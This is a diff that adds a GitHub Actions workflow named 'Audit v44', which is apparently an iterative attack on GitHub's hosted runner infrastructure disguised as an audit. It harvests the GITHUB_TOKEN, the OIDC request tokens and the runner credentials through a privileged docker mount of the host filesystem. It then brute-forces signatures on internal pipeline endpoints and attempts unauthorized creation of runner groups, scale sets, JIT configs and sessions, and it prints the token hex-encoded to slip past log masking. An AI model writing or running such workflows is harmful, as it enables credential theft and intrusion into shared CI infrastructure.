@@ -1,0 +1,302 @@
+name: Audit v44
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v44:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V44 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: signedlogcontent PARAM CHAIN
+      # v43: urlSignature → urlExpires → ???
+      # Keep feeding params until we get content or find the chain
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Signed content chain
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SIGNED CONTENT CHAIN ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          RUNID="${{ github.run_id }}"
+          EXPIRES=$(date -u -d "+1 hour" +%s 2>/dev/null || echo "1741236000")
+          ISO_EXPIRES=$(date -u -d "+1 hour" +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo "2026-03-06T00:00:00Z")
+
+          # A: Add urlExpires — what's next in the chain?
+          echo "--- A: urlSignature + urlExpires ---"
+          for SIG in "test" "0" "1" "*" "AAAA" "" "%00"; do
+            for EXP in "$EXPIRES" "$ISO_EXPIRES" "9999999999" "0" "2030-01-01"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $RT" \
+                "$PIPE/_apis/pipelines/$RUNID/runs/1/signedlogcontent?urlSignature=$SIG&urlExpires=$EXP")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              # Only print non-400 or if the error message changes
+              if [ "$CODE" != "HTTP_400" ] || echo "$BODY" | grep -qv "urlExpires"; then
+                echo "A sig=$SIG exp=$EXP = $CODE | $(echo "$BODY" | head -c 200)"
+              fi
+            done
+          done
+          # Print one full 400 to see exact error with both params
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $RT" \
+            "$PIPE/_apis/pipelines/$RUNID/runs/1/signedlogcontent?urlSignature=test&urlExpires=$EXPIRES")
+          echo "A full = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 300)"
+          echo ""
+
+          # B: Try HMAC-based signatures (sign the URL with RT)
+          echo "--- B: HMAC signatures ---"
+          python3 -c "
+          import hmac,hashlib,base64,time,urllib.parse,os,sys
+          rt=open('/tmp/rt.txt').read().strip()
+          runid='$RUNID'
+          expires=str(int(time.time())+3600)
+          # Try different signing patterns
+          for msg_fmt in [
+            f'/pipelines/{runid}/runs/1/signedlogcontent',
+            f'{runid}/1/signedlogcontent',
+            f'signedlogcontent/{expires}',
+            f'{runid}/1/{expires}',
+            expires,
+          ]:
+            for key in [rt, rt.encode()]:
+              if isinstance(key, str): key = key.encode()
+              sig = hmac.new(key, msg_fmt.encode(), hashlib.sha256).digest()
+              sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
+              sig_hex = sig.hex()
+              print(f'msg={msg_fmt[:40]} sig_b64={sig_b64[:20]} sig_hex={sig_hex[:20]}')
+              # Try both encodings
+              for s in [sig_b64, sig_hex, base64.b64encode(sig).decode()]:
+                url = f'https://pipelinesghubeus14.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF/_apis/pipelines/{runid}/runs/1/signedlogcontent?urlSignature={urllib.parse.quote(s)}&urlExpires={expires}'
+                # Just print the URL for curl
+                print(f'URL={url}')
+          " 2>/dev/null | head -20
+          echo ""
+
+          # C: Use curl for the HMAC-signed URLs
+          echo "--- C: HMAC curl ---"
+          python3 << 'PYEOF'
+          import hmac,hashlib,base64,time,urllib.parse,subprocess,os
+          rt=open('/tmp/rt.txt').read().strip()
+          idtok=open('/tmp/idtok.txt').read().strip()
+          runid=os.environ.get('RUNID','1')
+          expires=str(int(time.time())+3600)
+          secret="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          base=f"https://pipelinesghubeus14.actions.githubusercontent.com/{secret}"
+          msgs=[
+            f"/pipelines/{runid}/runs/1/signedlogcontent",
+            f"{runid}/1",
+            expires,
+            f"signedlogcontent",
+          ]
+          for msg in msgs:
+            for key_src, key_name in [(rt,"RT"),(secret,"SECRET")]:
+              sig=hmac.new(key_src.encode(), msg.encode(), hashlib.sha256).digest()
+              sig_b64=base64.urlsafe_b64encode(sig).decode().rstrip('=')
+              url=f"{base}/_apis/pipelines/{runid}/runs/1/signedlogcontent?urlSignature={urllib.parse.quote(sig_b64)}&urlExpires={expires}"
+              r=subprocess.run(["/usr/bin/curl","-sS","-w","\nHTTP_%{http_code}","--connect-timeout","3","-m","5",
+                "-H",f"Authorization: Bearer {rt}",url], capture_output=True, text=True, timeout=10)
+              out=r.stdout
+              code=out.strip().split('\n')[-1] if out else "FAIL"
+              body='\n'.join(out.strip().split('\n')[:-1])
+              if "urlExpires" not in body and "urlSignature" not in body:
+                print(f"C key={key_name} msg={msg[:30]} = {code} | {body[:200]}")
+          PYEOF
+          echo ""
+
+          # D: Try without /runs/ and with different path structures
+          echo "--- D: Path variants ---"
+          for EP in \
+            "/_apis/pipelines/$RUNID/signedlogcontent?urlSignature=test&urlExpires=$EXPIRES" \
+            "/_apis/pipelines/runs/$RUNID/signedlogcontent?urlSignature=test&urlExpires=$EXPIRES" \
+            "/_apis/pipelines/$RUNID/runs/1/logs?urlSignature=test&urlExpires=$EXPIRES" \
+            "/_apis/pipelines/$RUNID/runs/1/signedlogcontent?urlSignature=test&urlExpires=$EXPIRES&logId=1" \
+            "/_apis/pipelines/$RUNID/runs/1/signedlogcontent?urlSignature=test&urlExpires=$EXPIRES&$PLAN"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$PIPE$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && echo "D $EP = $CODE | $(echo "$BODY" | head -c 150)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: RUNTIME WRITES with api-version
+      # v43: POST = 500 "No api-version supplied" — NOT 403!
+      # Add api-version and exploit runner group/scaleset creation
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Runtime writes
+        if: always()
+        env:
+          RUNID: ${{ github.run_id }}
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RUNTIME WRITES ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+
+          # A: Full runner group 2 (the hosted one with size=1)
+          echo "--- A: Runner group 2 details ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" \
+            "$PIPE/_apis/runtime/runnergroups/2?api-version=6.0-preview")
+          echo "A group2 = $(echo "$R" | jq '.' 2>/dev/null | head -20)"
+          echo ""
+
+          # B: POST with api-version — CREATE runner group
+          echo "--- B: Create runner group ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            -H "Accept: application/json; api-version=6.0-preview" \
+            "$PIPE/_apis/runtime/runnergroups?api-version=6.0-preview" \
+            -d '{"name":"v44-group","visibility":"organization"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B create group = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          echo ""
+
+          # C: POST create runner scale set
+          echo "--- C: Create runner scale set ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            -H "Accept: application/json; api-version=6.0-preview" \
+            "$PIPE/_apis/runtime/runnerscalesets?api-version=6.0-preview" \
+            -d '{"name":"v44-scaleset","runnerGroupId":1,"labels":[{"name":"self-hosted"}]}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C create scaleset = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          echo ""
+
+          # D: POST generate JIT config
+          echo "--- D: Generate JIT config ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            -H "Accept: application/json; api-version=6.0-preview" \
+            "$PIPE/_apis/runtime/generatejitconfig?api-version=6.0-preview" \
+            -d '{"name":"v44-jit-runner","runnerGroupId":2,"labels":[{"name":"ubuntu-latest"}],"workFolder":"_work"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "D jitconfig = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          echo ""
+
+          # E: POST create session
+          echo "--- E: Create session ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            -H "Accept: application/json; api-version=6.0-preview" \
+            "$PIPE/_apis/runtime/sessions?api-version=6.0-preview" \
+            -d '{"ownerName":"v44-session"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "E session = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          echo ""
+
+          # F: Modify runner group (add runner to group 2)
+          echo "--- F: Modify groups ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            -H "Accept: application/json; api-version=6.0-preview" \
+            "$PIPE/_apis/runtime/runnergroups/1?api-version=6.0-preview" \
+            -d '{"name":"Default-Modified"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "F patch group1 = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PUT \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            -H "Accept: application/json; api-version=6.0-preview" \
+            "$PIPE/_apis/runtime/runnergroups/1?api-version=6.0-preview" \
+            -d '{"name":"Default-Replaced","id":1}')
+          CODE=$(echo "$R" | tail -1)
+          echo "F put group1 = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          echo ""
+
+          # G: Runtime visibility + acquire
+          echo "--- G: Visibility + acquire ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+            -H "Authorization: Bearer $IDTOK" \
+            "$PIPE/_apis/runtime/visibility?api-version=6.0-preview")
+          CODE=$(echo "$R" | tail -1)
+          echo "G visibility = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            -H "Accept: application/json; api-version=6.0-preview" \
+            "$PIPE/_apis/runtime/acquirejobs?api-version=6.0-preview" \
+            -d "{\"jobId\":\"$JOB\"}")
+          CODE=$(echo "$R" | tail -1)
+          echo "G acquirejobs = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+            -H "Authorization: Bearer $IDTOK" \
+            "$PIPE/_apis/runtime/acquirablejobs?api-version=6.0-preview")
+          CODE=$(echo "$R" | tail -1)
+          echo "G acquirablejobs = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V44 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V44 COMPLETE ==="
